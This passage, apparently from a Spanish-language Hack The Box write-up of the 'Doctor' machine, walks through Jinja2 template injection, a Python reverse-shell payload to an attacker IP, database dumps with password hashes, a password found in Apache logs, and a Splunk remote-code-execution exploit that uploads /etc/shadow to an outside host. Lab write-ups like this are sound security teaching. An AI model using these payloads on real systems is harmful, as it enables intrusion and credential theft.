&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; ?&amp;gt;&lt;/span&gt;
	&lt;span class=&#34;nt&#34;&gt;&amp;lt;rss&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;version=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;2.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
	&lt;span class=&#34;nt&#34;&gt;&amp;lt;channel&amp;gt;&lt;/span&gt;
 	&lt;span class=&#34;nt&#34;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Archive&lt;span class=&#34;nt&#34;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
 	&lt;span class=&#34;nt&#34;&gt;&amp;lt;item&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;Doctor&lt;span class=&#34;nt&#34;&gt;&amp;lt;/title&amp;gt;&amp;lt;/item&amp;gt;&lt;/span&gt;

			&lt;span class=&#34;nt&#34;&gt;&amp;lt;/channel&amp;gt;&lt;/span&gt;			
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Intentamos con XXE con diferentes &amp;ldquo;payloads&amp;rdquo; en el titulo pero no retornaba ningun valor. Luego de explorar algunas vulnerabilidades &amp;ldquo;parecidas&amp;rdquo; encontramos &lt;a href=&#34;https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2&#34;&gt;&lt;code&gt;Server Side Template Injection - Jinja&lt;/code&gt;&lt;/a&gt; en Python, utilizando los diferentes Payloads iniciales, vemos valores retornados.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;{{&lt;/span&gt;4*4&lt;span class=&#34;o&#34;&gt;}}[[&lt;/span&gt;5*5&lt;span class=&#34;o&#34;&gt;]]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/doctor/Screenshotfrom2020-12-3019.36.22.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Tambien logramos obtener un poco de informacion como la direccion de la base de datos, la direccion de la aplicacion, su codigo fuente y el contenido de la base de datos, ejecutando algunos comandos con un payload para ejecucion de estos.&lt;/p&gt;

&lt;div id=&#34;78b156bd95e1f355&#34; class=&#34;codetab&#34;&gt;
  &lt;div class=&#34;codetab__links&#34;&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;bash&lt;/button&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;xml&lt;/button&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;bash&lt;/button&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;python&lt;/button&gt;
    
  &lt;/div&gt;
  
  
  
&lt;div id=&#34;6f05a7dea05ed976&#34; class=&#34;codetab__content&#34;&gt;
  &lt;pre&gt;&lt;code class=&#34;language-bash:payloads&#34; data-lang=&#34;bash:payloads&#34;&gt;#configuracion
{{config.items()}}

#Ejecucion de comandos
{{config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()}}
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

  
&lt;div id=&#34;9d3035ae83b8028c&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-xml&#34; data-lang=&#34;xml&#34;&gt;&lt;span class=&#34;c&#34;&gt;&amp;lt;!-- Direccion /archive --&amp;gt;&lt;/span&gt;
&lt;span class=&#34;cp&#34;&gt;&amp;lt;?xml version=&amp;#34;1.0&amp;#34; encoding=&amp;#34;UTF-8&amp;#34; ?&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;rss&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;version=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;2.0&amp;#34;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;channel&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;title&amp;gt;&lt;/span&gt;Archive&lt;span class=&#34;nt&#34;&gt;&amp;lt;/title&amp;gt;&lt;/span&gt;
&lt;span class=&#34;nt&#34;&gt;&amp;lt;item&amp;gt;&amp;lt;title&amp;gt;&lt;/span&gt;dict_items([(&amp;#39;ENV&amp;#39;, &amp;#39;production&amp;#39;), (&amp;#39;DEBUG&amp;#39;, False), (&amp;#39;TESTING&amp;#39;, False), (&amp;#39;PROPAGATE_EXCEPTIONS&amp;#39;, None), (&amp;#39;PRESERVE_CONTEXT_ON_EXCEPTION&amp;#39;, None), (&amp;#39;SECRET_KEY&amp;#39;, &amp;#39;1234&amp;#39;), (&amp;#39;PERMANENT_SESSION_LIFETIME&amp;#39;, datetime.timedelta(days=31)), (&amp;#39;USE_X_SENDFILE&amp;#39;, False), (&amp;#39;SERVER_NAME&amp;#39;, None), (&amp;#39;APPLICATION_ROOT&amp;#39;, &amp;#39;/&amp;#39;), (&amp;#39;SESSION_COOKIE_NAME&amp;#39;, &amp;#39;session&amp;#39;), (&amp;#39;SESSION_COOKIE_DOMAIN&amp;#39;, False), (&amp;#39;SESSION_COOKIE_PATH&amp;#39;, None), (&amp;#39;SESSION_COOKIE_HTTPONLY&amp;#39;, True), (&amp;#39;SESSION_COOKIE_SECURE&amp;#39;, False), (&amp;#39;SESSION_COOKIE_SAMESITE&amp;#39;, None), (&amp;#39;SESSION_REFRESH_EACH_REQUEST&amp;#39;, True), (&amp;#39;MAX_CONTENT_LENGTH&amp;#39;, None), (&amp;#39;SEND_FILE_MAX_AGE_DEFAULT&amp;#39;, datetime.timedelta(seconds=43200)), (&amp;#39;TRAP_BAD_REQUEST_ERRORS&amp;#39;, None), (&amp;#39;TRAP_HTTP_EXCEPTIONS&amp;#39;, False), (&amp;#39;EXPLAIN_TEMPLATE_LOADING&amp;#39;, False), (&amp;#39;PREFERRED_URL_SCHEME&amp;#39;, &amp;#39;http&amp;#39;), (&amp;#39;JSON_AS_ASCII&amp;#39;, True), (&amp;#39;JSON_SORT_KEYS&amp;#39;, True), (&amp;#39;JSONIFY_PRETTYPRINT_REGULAR&amp;#39;, False), (&amp;#39;JSONIFY_MIMETYPE&amp;#39;, &amp;#39;application/json&amp;#39;), (&amp;#39;TEMPLATES_AUTO_RELOAD&amp;#39;, None), (&amp;#39;MAX_COOKIE_SIZE&amp;#39;, 4093), (&amp;#39;MAIL_PASSWORD&amp;#39;, &amp;#39;doctor&amp;#39;), (&amp;#39;MAIL_PORT&amp;#39;, 587), (&amp;#39;MAIL_SERVER&amp;#39;, &amp;#39;&amp;#39;), (&amp;#39;MAIL_USERNAME&amp;#39;, &amp;#39;doctor&amp;#39;), (&amp;#39;MAIL_USE_TLS&amp;#39;, True), (&amp;#39;SQLALCHEMY_DATABASE_URI&amp;#39;, &amp;#39;sqlite://///home/web/blog/flaskblog/site.db&amp;#39;), (&amp;#39;WTF_CSRF_CHECK_DEFAULT&amp;#39;, False), (&amp;#39;SQLALCHEMY_BINDS&amp;#39;, None), (&amp;#39;SQLALCHEMY_NATIVE_UNICODE&amp;#39;, None), (&amp;#39;SQLALCHEMY_ECHO&amp;#39;, False), (&amp;#39;SQLALCHEMY_RECORD_QUERIES&amp;#39;, None), (&amp;#39;SQLALCHEMY_POOL_SIZE&amp;#39;, None), (&amp;#39;SQLALCHEMY_POOL_TIMEOUT&amp;#39;, None), (&amp;#39;SQLALCHEMY_POOL_RECYCLE&amp;#39;, None), (&amp;#39;SQLALCHEMY_MAX_OVERFLOW&amp;#39;, None), (&amp;#39;SQLALCHEMY_COMMIT_ON_TEARDOWN&amp;#39;, False), (&amp;#39;SQLALCHEMY_TRACK_MODIFICATIONS&amp;#39;, None), (&amp;#39;SQLALCHEMY_ENGINE_OPTIONS&amp;#39;, {})])&lt;span class=&#34;nt&#34;&gt;&amp;lt;/title&amp;gt;&amp;lt;/item&amp;gt;&lt;/span&gt;

    &lt;span class=&#34;nt&#34;&gt;&amp;lt;/channel&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

  
&lt;div id=&#34;f9c53ad1608bad33&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash:blog.sh&#34; data-lang=&#34;bash:blog.sh&#34;&gt;&lt;span class=&#34;cp&#34;&gt;#!/bin/bash
&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;SECRET_KEY&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1234&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;SQLALCHEMY_DATABASE_URI&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;sqlite://///home/web/blog/flaskblog/site.db /usr/bin/python3 /home/web/blog/run.py
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

  
&lt;div id=&#34;c87a553d7b670817&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-python:run.py&#34; data-lang=&#34;python:run.py&#34;&gt;&lt;span class=&#34;kn&#34;&gt;from&lt;/span&gt; &lt;span class=&#34;nn&#34;&gt;flaskblog&lt;/span&gt; &lt;span class=&#34;kn&#34;&gt;import&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;create_app&lt;/span&gt;

&lt;span class=&#34;n&#34;&gt;app&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;create_app&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;vm&#34;&gt;__name__&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;==&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;__main__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;:&lt;/span&gt;
    &lt;span class=&#34;n&#34;&gt;app&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;run&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;debug&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;bp&#34;&gt;False&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

  

&lt;/div&gt;

&lt;script&gt;
  &#39;use strict&#39;;

  var containerId = JSON.parse(&#34;\&#34;78b156bd95e1f355\&#34;&#34;);
  var containerElem = document.getElementById(containerId);
  var codetabLinks = null;
  var codetabContents = null;
  var ids = [];

  if (containerElem) {
    codetabLinks = containerElem.querySelectorAll(&#39;.codetab__link&#39;);
    codetabContents = containerElem.querySelectorAll(&#39;.codetab__content&#39;);
  }

  for (var i = 0; i &lt; codetabContents.length; i++) {
    ids = ids.concat(codetabContents[i].getAttribute(&#39;id&#39;));
    codetabContents[i].style.display = &#39;none&#39;;

    if (0 === parseInt(i, 10) &amp;&amp; !codetabContents[i].classList.contains(&#39;active&#39;)) {
      codetabContents[i].classList.add(&#39;active&#39;);
    }
  }

  for (var i = 0; i &lt; codetabLinks.length; i++) {
    codetabLinks[i].setAttribute(&#39;id&#39;, ids[i]);

    if (0 === parseInt(i, 10) &amp;&amp; !codetabLinks[i].classList.contains(&#39;active&#39;)) {
      codetabLinks[i].classList.add(&#39;active&#39;);
    } else {
      codetabLinks[i].classList.remove(&#39;active&#39;);
    }
  }

  if (codetabContents.length &gt; 0) {
    codetabContents[0].style.display = &#39;block&#39;;
  }
&lt;/script&gt;
&lt;p&gt;En la base de datos encontramos el Post donde vemos el contenido de nuestro payload para realizar la lectura del archivo de base de datos, tambien vemos nuestro usuario con la informacion de registro y autenticacion, tambien el usuario admin.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/htb/doctor$ sqlite3 site.db 
SQLite version 3.33.0 2020-08-14 13:23:32
Enter &lt;span class=&#34;s2&#34;&gt;&amp;#34;.help&amp;#34;&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; usage hints.
sqlite&amp;gt; .databases
main: /home/kali/htb/doctor/site.db
sqlite&amp;gt; .tables
post  user
sqlite&amp;gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; * from post&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;Doctor blog&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;2020-09-18 20:48:37.55555&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;A free blog to share medical knowledge. Be kind!&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
2&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;{{&lt;/span&gt;config.__class__.__init__.__globals__&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;os&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;.popen&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cat /home/web/blog/flaskblog/site.db|base64&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.read&lt;span class=&#34;o&#34;&gt;()}}&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;2020-12-31 01:44:15.772119&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;doctor
&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
sqlite&amp;gt; &lt;span class=&#34;k&#34;&gt;select&lt;/span&gt; * from user&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
1&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;admin&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;admin@doctor.htb&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;default.gif&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;b&lt;span class=&#34;nv&#34;&gt;$12$Tg2b8u&lt;/span&gt;/elwAyfQOvqvxJgOTcsbnkFANIDdv6jVXmxiWsg4IznjI0S
2&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;doctor&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;doctor@d.com&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;default.gif&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$2&lt;/span&gt;b&lt;span class=&#34;nv&#34;&gt;$12$GKxenfwkogZHS97jty2qkODlTrlQeP90HN9VdN0LHTKwiGB8ANcPi&lt;/span&gt;
sqlite&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;web---user&#34;&gt;WEB - USER&lt;/h1&gt;
&lt;p&gt;Ejecutamos una shell inversa con la cual logramos obtener una shell con el usuario &lt;code&gt;web&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;{% for x in ().__class__.__base__.__subclasses__() %}{% if &amp;quot;warning&amp;quot; in x.__name__ %}{{x()._module.__builtins__[&#39;__import__&#39;](&#39;os&#39;).popen(&amp;quot;python3 -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&amp;quot;10.10.14.224\&amp;quot;,1338));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&amp;quot;/bin/bash\&amp;quot;]);&#39;&amp;quot;).read().zfill(417)}}{%endif%}{% endfor %}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/doctor/Screenshotfrom2020-12-3020.13.43.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Realizamos una enumeracion en la maquina, encontramos algunos archivos del usuario root los cuales seguramente se ejecutan cada cierto tiempo para restaurar los archivos de la aplicacion web.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;9
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;web@doctor:/opt/clean$ ls -lah
ls -lah
total 52K
drwxrwxr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root root 4,0K Sep  &lt;span class=&#34;m&#34;&gt;7&lt;/span&gt; 15:36 .
drwxr-xr-x &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; root root 4,0K Sep  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 17:56 ..
-rwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  &lt;span class=&#34;m&#34;&gt;211&lt;/span&gt; Sep  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 16:14 cleandb.py
-rwxr-xr-x &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  &lt;span class=&#34;m&#34;&gt;129&lt;/span&gt; Jul &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 19:35 clean.py
-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root  36K Sep  &lt;span class=&#34;m&#34;&gt;6&lt;/span&gt; 16:12 site.db
web@doctor:/opt/clean$
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;shaun---user&#34;&gt;SHAUN - USER&lt;/h1&gt;
&lt;p&gt;Realizamos una enumeracion y encontramos una contraseña en los logs de apache.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;web@doctor:/var/log/apache2$ grep password * |grep -v gobuster
grep password * |grep -v gobuster
backup:10.10.14.4 - - [05/Sep/2020:11:17:34 +2000] &amp;quot;POST /reset_password?email=Guitar123&amp;quot; 500 453 &amp;quot;http://doctor.htb/reset_password&amp;quot;
web@doctor:/var/log/apache2$
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Utilizamos la contraseña encontrada con el usuario &lt;code&gt;shaun&lt;/code&gt;, logramos obtener una shell y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/doctor/Screenshotfrom2020-12-3020.59.05.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h1&gt;
&lt;p&gt;Anteriormente encontramos en el puerto 8089 a splunk pero necesitabamos credenciales para poder ejecutar comandos o realizar lectura de archivos, con las credenciales de Shaun ejecutamos el exploit remoto lo que permitio realizar la lectura del archivo &lt;code&gt;/etc/shadow&lt;/code&gt;.&lt;/p&gt;

&lt;div id=&#34;59d3b08e224b5fa0&#34; class=&#34;codetab&#34;&gt;
  &lt;div class=&#34;codetab__links&#34;&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;bash&lt;/button&gt;
    
      &lt;button class=&#34;codetab__link&#34; aria-label=&#34;Tab link&#34;&gt;bash&lt;/button&gt;
    
  &lt;/div&gt;
  

  
&lt;div id=&#34;52f9e625f1b608b1&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;kali@kali:~/htb/doctor/SplunkWhisperer2/PySplunkWhisperer2$ python3 PySplunkWhisperer2_remote.py --host doctor.htb --port &lt;span class=&#34;m&#34;&gt;8089&lt;/span&gt; --username shaun --password &lt;span class=&#34;s2&#34;&gt;&amp;#34;Guitar123&amp;#34;&lt;/span&gt; --payload &lt;span class=&#34;s2&#34;&gt;&amp;#34;curl -F &amp;#39;data=@/etc/shadow&amp;#39; http://10.10.14.224:8081&amp;#34;&lt;/span&gt; --lhost 10.10.14.224
Running in remote mode &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;Remote Code Execution&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authenticating...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authenticated
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Creating malicious app bundle...
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Created malicious app bundle in: /tmp/tmpwp69gine.tar
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Started HTTP server &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; remote mode
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;.&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Installing app from: http://10.10.14.224:8181/
10.10.10.209 - - &lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;30/Dec/2020 22:23:59&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;GET / HTTP/1.1&amp;#34;&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;200&lt;/span&gt; -
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;+&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; App installed, your code should be running now!

Press RETURN to cleanup
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;

  
